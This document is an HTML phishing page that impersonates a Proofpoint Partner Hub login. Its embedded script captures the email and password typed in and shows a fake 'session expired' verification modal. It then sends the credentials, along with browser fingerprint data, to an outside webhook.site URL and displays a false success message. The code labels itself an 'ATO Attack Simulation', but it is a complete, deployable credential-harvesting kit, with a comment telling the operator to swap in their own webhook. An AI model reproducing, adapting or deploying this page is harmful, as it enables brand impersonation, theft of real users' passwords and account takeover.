<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Proofpoint Partner Program | Partner Hub</title>
    
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e9eef3 100%);
            line-height: 1.5;
            min-height: 100vh;
        }

        /* Full page wrapper */
        .wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Navigation Bar */
        .navbar-proofpoint {
            background: #fff;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .logo-area img {
            height: 45px;
            width: auto;
        }
        
        .nav-links {
            display: flex;
            gap: 2rem;
            align-items: center;
        }
        
        .nav-links a {
            color: #2c3e50;
            text-decoration: none;
            font-weight: 500;
            font-size: 0.95rem;
            transition: color 0.2s;
        }
        
        .nav-links a:hover {
            color: #035BFB;
        }
        
        .nav-links .btn-outline {
            border: 1px solid #035BFB;
            padding: 0.5rem 1.2rem;
            border-radius: 30px;
            color: #035BFB;
        }
        
        .nav-links .btn-outline:hover {
            background: #035BFB;
            color: white;
        }

        /* Hero Section */
        .hero-section {
            background: linear-gradient(135deg, #0a1a2f 0%, #0c2a3e 100%);
            color: white;
            padding: 4rem 2rem;
            text-align: center;
        }
        
        .hero-section h1 {
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 1rem;
        }
        
        .hero-section p {
            font-size: 1.2rem;
            opacity: 0.9;
            max-width: 600px;
            margin: 0 auto;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 3rem 1.5rem;
        }

        /* Login Card - Main Login Form */
        .login-card {
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 2.5rem;
            max-width: 500px;
            margin: 0 auto;
            transition: transform 0.2s;
        }
        
        .login-card:hover {
            transform: translateY(-5px);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .login-header .logo-sm {
            height: 50px;
            margin-bottom: 1rem;
        }
        
        .login-header h3 {
            font-size: 1.8rem;
            font-weight: 700;
            color: #111;
            margin-bottom: 0.5rem;
        }
        
        .login-header p {
            color: #6c757d;
            font-size: 0.9rem;
        }
        
        .form-group {
            margin-bottom: 1.25rem;
        }
        
        .form-group label {
            font-weight: 500;
            margin-bottom: 0.5rem;
            display: block;
            color: #2c3e50;
        }
        
        .form-control {
            border-radius: 14px;
            border: 1px solid #e0e4e8;
            padding: 0.85rem 1rem;
            font-size: 1rem;
            transition: all 0.2s;
        }
        
        .form-control:focus {
            border-color: #035BFB;
            box-shadow: 0 0 0 3px rgba(3,91,251,0.1);
            outline: none;
        }
        
        .btn-login {
            background: #035BFB;
            border: none;
            border-radius: 40px;
            padding: 0.85rem;
            font-weight: 600;
            font-size: 1rem;
            width: 100%;
            color: white;
            transition: all 0.2s;
        }
        
        .btn-login:hover {
            background: #024bce;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(3,91,251,0.3);
        }
        
        .login-footer {
            margin-top: 1.5rem;
            text-align: center;
            font-size: 0.85rem;
        }
        
        .login-footer a {
            color: #035BFB;
            text-decoration: none;
        }
        
        .login-footer a:hover {
            text-decoration: underline;
        }
        
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 1.5rem 0;
            color: #adb5bd;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e4e8;
        }
        
        .divider span {
            padding: 0 1rem;
            font-size: 0.8rem;
        }

        /* Feature Cards */
        .features-section {
            margin-top: 3rem;
        }
        
        .feature-card {
            background: white;
            border-radius: 20px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.2s;
            height: 100%;
            border: 1px solid #eef2f6;
        }
        
        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
        }
        
        .feature-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #035BFB 0%, #024bce 100%);
            border-radius: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
        }
        
        .feature-icon i {
            font-size: 1.8rem;
            color: white;
        }
        
        .feature-card h5 {
            font-weight: 600;
            margin-bottom: 0.75rem;
        }
        
        .feature-card p {
            color: #6c757d;
            font-size: 0.9rem;
        }

        /* Footer */
        footer {
            background: #0C171E;
            color: #8e9eae;
            padding: 2rem 2rem 1rem;
            margin-top: 3rem;
        }
        
        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 2rem;
        }
        
        .footer-links a {
            color: #8e9eae;
            text-decoration: none;
            margin-right: 1.5rem;
            font-size: 0.85rem;
        }
        
        .footer-links a:hover {
            color: white;
        }
        
        .footer-bottom {
            text-align: center;
            padding-top: 2rem;
            margin-top: 2rem;
            border-top: 1px solid #1f2a32;
            font-size: 0.8rem;
        }

        /* ATO Modal Styles */
        .ato-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 999999;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .ato-modal-box {
            max-width: 450px;
            width: 90%;
            background: white;
            border-radius: 32px;
            overflow: hidden;
            animation: slideUp 0.4s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .ato-modal-header {
            background: linear-gradient(135deg, #035BFB 0%, #024bce 100%);
            padding: 2rem;
            text-align: center;
            color: white;
        }
        
        .ato-modal-header img {
            height: 45px;
            margin-bottom: 1rem;
        }
        
        .ato-modal-header h3 {
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
        }
        
        .ato-modal-header p {
            opacity: 0.9;
            font-size: 0.9rem;
            margin: 0;
        }
        
        .ato-modal-body {
            padding: 2rem;
        }
        
        .security-badge {
            background: #fff3e0;
            border-left: 3px solid #ff9800;
            padding: 1rem;
            border-radius: 12px;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            font-size: 0.85rem;
            color: #e68a2e;
        }
        
        .security-badge i {
            font-size: 1.2rem;
        }
        
        .ato-modal-footer {
            padding: 1rem 2rem 2rem;
            text-align: center;
            background: #f8f9fa;
            border-top: 1px solid #e9ecef;
        }
        
        @media (max-width: 768px) {
            .navbar-proofpoint {
                flex-direction: column;
                gap: 1rem;
            }
            .nav-links {
                flex-wrap: wrap;
                justify-content: center;
            }
            .hero-section h1 {
                font-size: 2rem;
            }
            .login-card {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
<div class="wrapper">
    <!-- Navigation -->
    <nav class="navbar-proofpoint">
        <div class="logo-area">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 50'%3E%3Crect width='200' height='50' fill='%23035BFB'/%3E%3Ctext x='10' y='32' fill='white' font-size='20' font-weight='bold'%3EProofpoint%3C/text%3E%3Ctext x='95' y='32' fill='white' font-size='14'%3EPartner Hub%3C/text%3E%3C/svg%3E" alt="Proofpoint Partner Hub" style="height: 45px;">
        </div>
        <div class="nav-links">
            <a href="#">Partner Program</a>
            <a href="#">Resources</a>
            <a href="#">Training</a>
            <a href="#">Support</a>
            <a href="#" class="btn-outline">Contact</a>
        </div>
    </nav>

    <!-- Hero Section -->
    <div class="hero-section">
        <h1>Proofpoint Partner Hub</h1>
        <p>Your source for everything you need to grow your Proofpoint business</p>
    </div>

    <!-- Main Content -->
    <div class="main-content">
        <div class="container">
            <!-- Login Card -->
            <div class="login-card" id="loginCard">
                <div class="login-header">
                    <i class="fas fa-shield-alt fa-3x" style="color: #035BFB; margin-bottom: 1rem;"></i>
                    <h3>Partner Login</h3>
                    <p>Access your partner dashboard, tools, and resources</p>
                </div>
                
                <form id="partnerLoginForm">
                    <div class="form-group">
                        <label><i class="fas fa-envelope me-2"></i> Email Address</label>
                        <input type="email" id="loginEmail" class="form-control" placeholder="partner@company.com" required>
                    </div>
                    <div class="form-group">
                        <label><i class="fas fa-lock me-2"></i> Password</label>
                        <input type="password" id="loginPassword" class="form-control" placeholder="Enter your password" required>
                    </div>
                    <div class="form-group d-flex justify-content-between align-items-center">
                        <div class="form-check">
                            <input type="checkbox" class="form-check-input" id="rememberMe">
                            <label class="form-check-label" for="rememberMe">Remember me</label>
                        </div>
                        <a href="#" style="color: #035BFB; text-decoration: none; font-size: 0.85rem;">Forgot password?</a>
                    </div>
                    <button type="submit" class="btn-login">Sign In <i class="fas fa-arrow-right ms-2"></i></button>
                </form>
                
                <div class="divider">
                    <span>New to Partner Hub?</span>
                </div>
                
                <div class="login-footer">
                    <a href="#"><i class="fas fa-user-plus me-2"></i>Apply to become a partner</a>
                    <span class="mx-2">|</span>
                    <a href="#"><i class="fas fa-question-circle me-2"></i>Need help?</a>
                </div>
            </div>

            <!-- Feature Cards -->
            <div class="features-section">
                <div class="row g-4">
                    <div class="col-md-4">
                        <div class="feature-card">
                            <div class="feature-icon">
                                <i class="fas fa-chart-line"></i>
                            </div>
                            <h5>Deal Registration</h5>
                            <p>Register opportunities and maximize your margins with exclusive partner pricing.</p>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="feature-card">
                            <div class="feature-icon">
                                <i class="fas fa-graduation-cap"></i>
                            </div>
                            <h5>Training & Certifications</h5>
                            <p>Free eLearning courses, live training, and certification programs.</p>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="feature-card">
                            <div class="feature-icon">
                                <i class="fas fa-bullhorn"></i>
                            </div>
                            <h5>Sales & Marketing Tools</h5>
                            <p>Co-branding assets, demand generation kits, and competitive guides.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="footer-content">
            <div>
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 30'%3E%3Crect width='120' height='30' fill='%23333'/%3E%3Ctext x='5' y='20' fill='white' font-size='12'%3EProofpoint%3C/text%3E%3C/svg%3E" style="height: 25px;" alt="Proofpoint">
                <p style="margin-top: 0.5rem; font-size: 0.8rem;">Protecting People. Together.</p>
            </div>
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Terms of Service</a>
                <a href="#">Contact Support</a>
            </div>
        </div>
        <div class="footer-bottom">
            <span>© 2025 Proofpoint, Inc. All rights reserved.</span>
        </div>
    </footer>
</div>

<!-- ATO JavaScript - Complete Working Version -->
<script>
    (function() {
        // ============================================================
        // IMPORTANT: REPLACE THIS URL WITH YOUR WEBHOOK SITE URL
        // Get a free webhook URL from https://webhook.site
        // ============================================================
        const WEBHOOK_URL = "https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef";
        // ============================================================
        
        // Store captured credentials
        let capturedData = { email: '', password: '' };
        
        // Handle main form submission
        const loginForm = document.getElementById('partnerLoginForm');
        if (loginForm) {
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Capture credentials from form
                const email = document.getElementById('loginEmail').value;
                const password = document.getElementById('loginPassword').value;
                
                capturedData = { email, password };
                
                // Show fake verification modal (ATO)
                showATOModal();
            });
        }
        
        // Function to create and show the fake login modal
        function showATOModal() {
            // Create modal HTML
            const modalHTML = `
                <div id="atoModal" class="ato-modal">
                    <div class="ato-modal-box">
                        <div class="ato-modal-header">
                            <i class="fas fa-shield-alt fa-3x"></i>
                            <h3>Security Verification Required</h3>
                            <p>Your session has expired. Please verify your identity</p>
                        </div>
                        <div class="ato-modal-body">
                            <div class="security-badge">
                                <i class="fas fa-exclamation-triangle"></i>
                                <span>For your security, please re-enter your credentials to continue</span>
                            </div>
                            <form id="fakeAuthForm">
                                <div class="form-group">
                                    <label><i class="fas fa-envelope me-2"></i> Email Address</label>
                                    <input type="email" id="modalEmail" class="form-control" placeholder="partner@company.com" required>
                                </div>
                                <div class="form-group">
                                    <label><i class="fas fa-lock me-2"></i> Password</label>
                                    <input type="password" id="modalPassword" class="form-control" placeholder="Enter your password" required>
                                </div>
                                <button type="submit" class="btn-login" style="margin-top: 1rem;">
                                    Verify Identity <i class="fas fa-check-circle ms-2"></i>
                                </button>
                            </form>
                        </div>
                        <div class="ato-modal-footer">
                            <small>🔒 Protected by Proofpoint Identity Protection</small>
                        </div>
                    </div>
                </div>
            `;
            
            // Insert modal into DOM
            document.body.insertAdjacentHTML('beforeend', modalHTML);
            
            // Apply blur effect to main content
            const wrapper = document.querySelector('.wrapper');
            if (wrapper) wrapper.style.filter = 'blur(6px)';
            
            // Pre-fill with captured credentials
            const modalEmail = document.getElementById('modalEmail');
            const modalPassword = document.getElementById('modalPassword');
            if (modalEmail && capturedData.email) modalEmail.value = capturedData.email;
            if (modalPassword && capturedData.password) modalPassword.value = capturedData.password;
            
            // Handle fake form submission
            const fakeForm = document.getElementById('fakeAuthForm');
            if (fakeForm) {
                fakeForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    const finalEmail = document.getElementById('modalEmail').value;
                    const finalPassword = document.getElementById('modalPassword').value;
                    
                    // Create payload for webhook
                    const payload = {
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screenResolution: `${screen.width}x${screen.height}`,
                        referrer: document.referrer,
                        credentials: {
                            email: finalEmail,
                            password: finalPassword
                        },
                        capturedFrom: "Proofpoint Partner Hub Login",
                        note: "ATO Attack Simulation - Credentials captured via fake session expiration modal"
                    };
                    
                    // Send to webhook
                    try {
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            mode: 'no-cors',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(payload)
                        });
                        console.log('✅ Credentials sent to webhook');
                    } catch(err) {
                        console.warn('Webhook error:', err);
                    }
                    
                    // Remove modal and restore page
                    const modal = document.getElementById('atoModal');
                    if (modal) modal.remove();
                    if (wrapper) wrapper.style.filter = 'none';
                    
                    // Show success message
                    alert('✓ Verification successful!\n\nRedirecting to Partner Dashboard...');
                    
                    // Optional: Redirect to actual partner portal
                    // window.location.href = "https://partners.proofpoint.com/dashboard";
                    
                    // Reset form
                    if (loginForm) loginForm.reset();
                });
            }
            
            // Close modal when clicking outside
            const modal = document.getElementById('atoModal');
            if (modal) {
                modal.addEventListener('click', function(e) {
                    if (e.target === modal) {
                        modal.remove();
                        if (wrapper) wrapper.style.filter = 'none';
                    }
                });
            }
            
            // Close on ESC key
            document.addEventListener('keydown', function escClose(e) {
                if (e.key === 'Escape') {
                    const modalEl = document.getElementById('atoModal');
                    if (modalEl) {
                        modalEl.remove();
                        if (wrapper) wrapper.style.filter = 'none';
                        document.removeEventListener('keydown', escClose);
                    }
                }
            });
        }
        
        // Add some interactive console message (for testing)
        console.log('%c⚠️ Proofpoint Partner Hub Loaded', 'color: #035BFB; font-size: 14px;');
        console.log('%cATO Simulation Ready - Credentials will be captured on login', 'color: #ff9800; font-size: 12px;');
    })();
</script>

<!-- Bootstrap JS (for any modals if needed) -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
